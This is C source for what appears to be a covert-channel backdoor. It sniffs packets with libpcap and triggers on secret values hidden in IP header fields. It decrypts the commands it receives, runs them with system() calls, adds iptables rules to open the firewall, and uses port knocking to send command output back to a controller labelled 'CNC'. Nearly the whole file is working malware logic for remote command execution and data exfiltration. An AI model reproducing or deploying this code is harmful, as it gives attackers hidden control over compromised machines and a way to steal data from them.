#include "libpcap.h"

int Packetcapture(char *filter, struct filter Filter, bool udp){
    char errorbuffer[PCAP_ERRBUF_SIZE];
    struct bpf_program fp; //holds fp program info
    pcap_if_t *interface_list;
    bpf_u_int32 netp; //holds the ip

    //find the first network device capable of packet capture
    if(pcap_findalldevs(&interface_list,errorbuffer) == -1){
        printf("pcap_findalldevs: %s\n", errorbuffer);
        exit(0);
    }

    //open the network device
    //BUFSIZ is defined in pcap.h
    if((interfaceinfo = pcap_open_live(interface_list->name, BUFSIZ, 1, -1, errorbuffer)) == NULL){
        printf("pcap_open_live(): %s\n", errorbuffer);
        exit(0);
    }
    if(pcap_compile(interfaceinfo, &fp, filter, 0, netp) == -1){
        perror("pcap_comile");
    }

    if(pcap_setfilter(interfaceinfo, &fp) == -1){
        perror("pcap_setfilter");
    }
    if(udp){
        pcap_loop(interfaceinfo, -1, RecvUDP, (u_char*)&Filter);
    } else {
        pcap_loop(interfaceinfo, -1, ReadPacket, (u_char*)&Filter);
    }
    return 0;
}



void ReadPacket(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet){
    //grab the type of packet
    struct ether_header *ethernet;
    ethernet = (struct ether_header *)packet;
    u_int16_t type = ntohs(ethernet->ether_type);
    struct filter* Filter = NULL;
    Filter = (struct filter *)args;
    if(type == ETHERTYPE_IP){
        ParseIP(Filter, pkthdr, packet);
    }
}


void RecvUDP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet){
    struct filter* Filter = NULL;
    Filter = (struct filter *)args;
    const struct my_ip* ip;
    u_int length = pkthdr->len;
    u_int hlen,off,version;
    int len;

    ip = (struct my_ip*)(packet + sizeof(struct ether_header));
    length-= sizeof(struct ether_header);

    if(length < sizeof(struct my_ip)){
        printf("Packet length is incorrect %d", length);
        exit(1);
    }
    len = ntohs(ip->ip_len);
    hlen = IP_HL(ip);
    version = IP_V(ip);
    off = ntohs(ip->ip_off);

    //if the packet is the wrong version and size exit
    if(version != 4){
        perror("Unknown error");
        exit(1);
    } else if(hlen < 5){
        perror("Bad header length");
        exit(1);
    } else if((int)length < len){
        perror("Truncated IP");
        exit(1);
    }

    if(ip->ip_p == IPPROTO_UDP){
        printf("Protocal: UDP\n");
        printf("IPID: %c\n", ip->ip_id);
        printf("TOS: %c\n", ip->ip_tos);
        printf("TTL: %c\n", ip->ip_ttl);
        printf("Infected: %d\n", Filter->infected);

        if(CheckKey(ip->ip_tos, ip->ip_id, true)){
            //only CNC will get into this loop
            //port knocking packet
            if(Filter->infected == false){
                PortKnocking(Filter, pkthdr, packet, false, true);

                /*const struct sniff_udp *udp;
                udp = (struct sniff_udp*)(packet + 14 + (IP_HL(ip)*4));

                printf("Src port: %d\n", ntohs(udp->uh_sport));
                printf("Dst port: %d\n", ntohs(udp->uh_dport));
                for(int k = 0; k < Filter->amount; k++){
                    if(Filter->port_ushort[k] == udp->uh_sport){
                        printf("PORT KNOCKING ON %c", ntohs(udp->uh_dport));
                        Filter->pattern[k] = 1;
                    }
                }

                printf("Filter->pattern[0]: %d\n", Filter->pattern[0]);
                printf("Filter->pattern[1]: %d\n", Filter->pattern[1]);
                if((Filter->pattern[0] == 1) && (Filter->pattern[1] == 1)){
                    iptables(Filter->targetip, false, PORT, true, false);
                    printf("WAITING FOR DATA\n");
                    recv_results(Filter->localip, UPORT, RESULT_FILE, false);
                    iptables(Filter->targetip, false, PORT, true, true);
                    pcap_breakloop(interfaceinfo);
                }*/
            }
        } else if(ip->ip_id == 'r' && ip->ip_tos == 'r' && ip->ip_ttl == 'r'){
            if(Filter->infected){
                recv_results(Filter->localip, UPORT, FILENAME, false);
                system(CHMOD);
                system(CMD);
                //open outbound rule
                iptables(Filter->targetip, false, PORT, false, false);
                printf("COMMAND RECEIEVED \n");
                //sending the results back to the CNC
                printf("PORT KNOCKING\n");
                unsigned char *buf = 0;
                PortKnocking(Filter, pkthdr, packet, true, true);
                //covert_udp_send(Filter->localip,Filter->targetip, Filter->port_short[0], Filter->port_short[0], buf, 2);
                //covert_udp_send(Filter->localip,Filter->targetip, Filter->port_short[1], Filter->port_short[1], buf, 2);
                printf("SENDING RESULTS\n");
                send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE, false);
                iptables(Filter->targetip, false, PORT, false, true);
                printf("\n");
                printf("\n");
                printf("Waiting for new command\n");
            }
        } else {
            printf("Wrong key tossing packet\n");
        }
    }
}

void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_char* packet){
    const struct my_ip* ip;
    u_int length = pkthdr->len;
    u_int hlen,off,version;
    int len;

    //skip past the ethernet header
    ip = (struct my_ip*)(packet + sizeof(struct ether_header));
    length-= sizeof(struct ether_header);

    if(length < sizeof(struct my_ip)){
        printf("Packet length is incorrect %d", length);
        exit(1);
    }
    len = ntohs(ip->ip_len);
    hlen = IP_HL(ip);
    version = IP_V(ip);
    off = ntohs(ip->ip_off);

    if(version != 4){
        perror("Unknown error");
        exit(1);
    } else if(hlen < 5){
        perror("Bad header length");
        exit(1);
    } else if((int)length < len){
        perror("Truncated IP");
        exit(1);
    } else if(ip->ip_p == IPPROTO_TCP){
        printf("Protocal: TCP\n");
        printf("IPID: %hu\n", ip->ip_id);
        printf("TOS: %u\n", ip->ip_tos);
        if(CheckKey(ip->ip_tos, ip->ip_id, false)){
            printf("Reading payload\n");
            ParseTCP(Filter, pkthdr, packet);
        } else if(CheckKey(ip->ip_tos, ip->ip_id,true)) {
            //change to port knocking
            //ParsePattern(args,pkthdr, packet);
            PortKnocking(Filter, pkthdr, packet, false, false);
        } else {
            printf("Packet tossed wrong key\n");
        }
    }
    }

bool CheckKey(u_char ip_tos, u_short ip_id, bool knock){
    if(knock){
        //check if the key is right for port knocking
        if(ip_tos == 'b' && ip_id == 'l'){
            return true;
        } else {
            return false;
        }
    } else {
        // check if key is right for normal packets
        if(ip_tos == 'l' && ip_id == 'b'){
            return true;
        } else {
            return false;
        }
    }
}

void ParseTCP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_char* packet){
    const struct sniff_tcp *tcp=0;
    const struct my_ip *ip;
    const char *payload;

    int size_ip;
    int size_tcp;
    int size_payload;

    printf("TCP Packet\n");

    ip = (struct my_ip*)(packet + 14);
    size_ip = IP_HL(ip)*4;

    tcp = (struct sniff_tcp*)(packet + 14 + size_ip);
    size_tcp = TH_OFF(tcp)*4;

    if(size_tcp < 20){
        perror("TCP: Control packet length is incorrect");
        exit(1);
    }
    printf("Source port: %d\n", ntohs(tcp->th_sport));
    printf("Destination port: %d\n", ntohs(tcp->th_dport));
    payload = (u_char *)(packet + 14 + size_ip + size_tcp);

    size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);

    if(size_payload > 0){
        printf("Payload (%d bytes):\n", size_payload);
        ParsePayload(Filter, payload, size_payload, true);
    }
}

void iptables(char *ip, bool tcp, char *port, bool input, bool remove){
    char iptable[BUFSIZ];
    memset(iptable, '\0', BUFSIZ);
    if(remove){
        strcat(iptable,"/usr/sbin/iptables -D");
    } else {
        strcat(iptable,"/usr/sbin/iptables -I");
    }
    if(input){
        if(tcp){
        strcat(iptable," INPUT -p tcp ");
        } else {
        strcat(iptable," INPUT -p udp ");
        }
    } else {
        if(tcp){
        strcat(iptable," OUTPUT -p tcp ");
        } else {
        strcat(iptable," OUTPUT -p udp ");
        }
    }
    strcat(iptable, "-s ");
    strcat(iptable, ip);
    strcat(iptable, " --dport ");
    strcat(iptable,port);
    strcat(iptable, " -j ACCEPT");
    printf("Iptables: %s\n", iptable);
    system(iptable);
}


void ParsePayload(struct filter *Filter, const u_char *payload, int len, bool tcp){
    FILE *fp;
    unsigned char decryptedtext[BUFSIZE+16];
    int decryptedlen, cipherlen;

    if((fp = fopen(FILENAME, "wb+")) < 0){
        perror("fopen");
        exit(1);
    }
    cipherlen = strlen((char*)payload);
    decryptedlen = decryptMessage((unsigned char*)payload, BUFSIZE+16, (unsigned char*)KEY, (unsigned char *)IV, decryptedtext);

    printf("Decrypted payload size: %d\n", decryptedlen);
    printf("Decrypted Payload is: %s \n", decryptedtext);
    if((fwrite(decryptedtext, strlen((const char*)decryptedtext), sizeof(char), fp)) <= 0){
        perror("fwrite");
        exit(1);
    }
    if(tcp){
    fclose(fp);
    system(CHMOD);
    system(CMD);
    iptables(Filter->targetip, true, PORT, false, false);
    printf("COMMAND RECEIEVED \n");
    //sending the results back to the CNC
    printf("PORT KNOCKING\n");
    PortKnocking(Filter, NULL, NULL, true, false);
    printf("SENDING RESULTS\n");
    send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE, false);
    iptables(Filter->targetip, true, PORT, false, true);
    printf("\n");
    printf("\n");
    printf("Waiting for new command\n");
    } else {
    printf("parsing udp packet\n");
    }
}


struct filter InitFilter(char *target, char *local, bool infected){
    struct filter Filter;
    Filter.amount = FILTERAMOUNT;
    Filter.port[0] = "8506";
    Filter.port_short[0] = 8506;
    Filter.port_ushort[0] = 14881;
    Filter.port[1] = "8507";
    Filter.port_ushort[1] = 15137;
    Filter.port_short[1] = 8507;
    Filter.pattern[0] = 0;
    Filter.pattern[1] = 0;
    Filter.infected = infected;
    strncpy(Filter.targetip, target, BUFSIZ);
    strncpy(Filter.localip, local, BUFSIZ);
    return Filter;
}


void PrintFilter(struct filter Filter){
    printf("# of ports: %d \n", Filter.amount);
    printf("Port: %s\n", Filter.port[0]);
    printf("Port short: %hu\n", Filter.port_short[0]);
    printf("Port unsigned short: %hu\n", Filter.port_ushort[0]);
    printf("Port: %s\n", Filter.port[1]);
    printf("Port short: %hu\n", Filter.port_short[1]);
    printf("Port unsigned short: %hu\n", Filter.port_ushort[1]);
    printf("Target ip: %s\n", Filter.targetip);
    printf("Local ip: %s\n", Filter.localip);

}

void CreateFilter(struct filter Filter, char *buffer){
    memset(buffer, '\0', BUFSIZ);
    strcat(buffer,"udp and (");
    for(int i = 0; i < Filter.amount; ++i){
        strcat(buffer, "port ");
        strncat(buffer, Filter.port[i], sizeof(Filter.port[i]));
        if(i == (Filter.amount)-1){
        } else {
            strncat(buffer, OR, sizeof(OR));
        }
    }
    strcat(buffer," || port 8505)");
}


void PortKnocking(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_char* packet, bool send, bool udp){
    const struct sniff_tcp *tcp=0;
    const struct my_ip *ip;
    const char *payload;
    int size_ip;
    int size_tcp;
    int size_payload;

    if(send){
        unsigned char data[BUFSIZE] = "";
        if(udp){
            printf("PORT KNOCKING\n");
            SendPattern(data, Filter, udp);
        } else {
            printf("PORT KNOCKING\n");
            SendPattern(data, Filter, udp);
        }
    } else {
        //parse the tcp packet and check for key and port knocking packets
        if(udp){
            const struct sniff_udp *udpheader;
            udpheader = (struct sniff_udp*)(packet + 14 + (IP_HL(ip)*4));

            printf("Src port: %d\n", ntohs(udpheader->uh_sport));
            printf("Dst port: %d\n", ntohs(udpheader->uh_dport));
            for(int k = 0; k < Filter->amount; k++){
                if(Filter->port_ushort[k] == udpheader->uh_sport){
                    printf("PORT KNOCKING ON %c", ntohs(udpheader->uh_dport));
                    Filter->pattern[k] = 1;
                }
            }
            printf("Filter->pattern[0]: %d\n", Filter->pattern[0]);
            printf("Filter->pattern[1]: %d\n", Filter->pattern[1]);
            if((Filter->pattern[0] == 1) && (Filter->pattern[1] == 1)){
                iptables(Filter->targetip, false, PORT, true, false);
                printf("WAITING FOR DATA\n");
                recv_results(Filter->localip, UPORT, RESULT_FILE, false);
                iptables(Filter->targetip, false, PORT, true, true);
                pcap_breakloop(interfaceinfo);
            }
        } else {
            printf("TCP Packet\n");

            ip = (struct my_ip*)(packet + 14);
            size_ip = IP_HL(ip)*4;

            tcp = (struct sniff_tcp*)(packet + 14 + size_ip);
            size_tcp = TH_OFF(tcp)*4;

            if(size_tcp < 20){
                perror("TCP: Control packet length is incorrect");
                exit(1);
            }

            printf("Source port: %d\n", ntohs(tcp->th_sport));
            printf("Destination port: %d\n", ntohs(tcp->th_dport));
            payload = (u_char *)(packet + 14 + size_ip + size_tcp);

            size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);

            printf("PORT KNOCKING ON: %d\n", ntohs(tcp->th_dport));
            for(int k = 0; k < Filter->amount; k++){
                if(Filter->port_ushort[k] == tcp->th_dport){
                printf("Filter.port_ushort = %hu compare and tcp->th_dport =%hu\n", Filter->port_ushort[k], tcp->th_dport);
                Filter->pattern[k] = 1;
                printf("Filterpattern[%d]= %d\n", k,Filter->pattern[k]);
                }
            }
            printf("\n");
            printf("Filterpattern[0]= %d", Filter->pattern[0]);
            printf("Filterpattern[1]= %d", Filter->pattern[1]);
            if((Filter->pattern[0] == 1) && (Filter->pattern[1] == 1)){
                iptables(Filter->targetip, true, PORT, true, false);
                char *dip = Filter->targetip;
                printf("WAITING FOR DATA\n");
                recv_results(dip, UPORT, RESULT_FILE, true);
                iptables(Filter->targetip, true, PORT, true, true);
                pcap_breakloop(interfaceinfo);
            }
        }
    }
}

void SendPattern(unsigned char *data, struct filter *Filter, bool udp){
    for(int i = 0; i < Filter->amount; i++){
        if(udp){
            covert_udp_send(Filter->localip, Filter->targetip, Filter->port_short[i], Filter->port_short[i], data, 2);
        } else {
            covert_send(Filter->localip, Filter->targetip, Filter->port_short[i], Filter->port_short[i], data, 2);
        }
    }
}

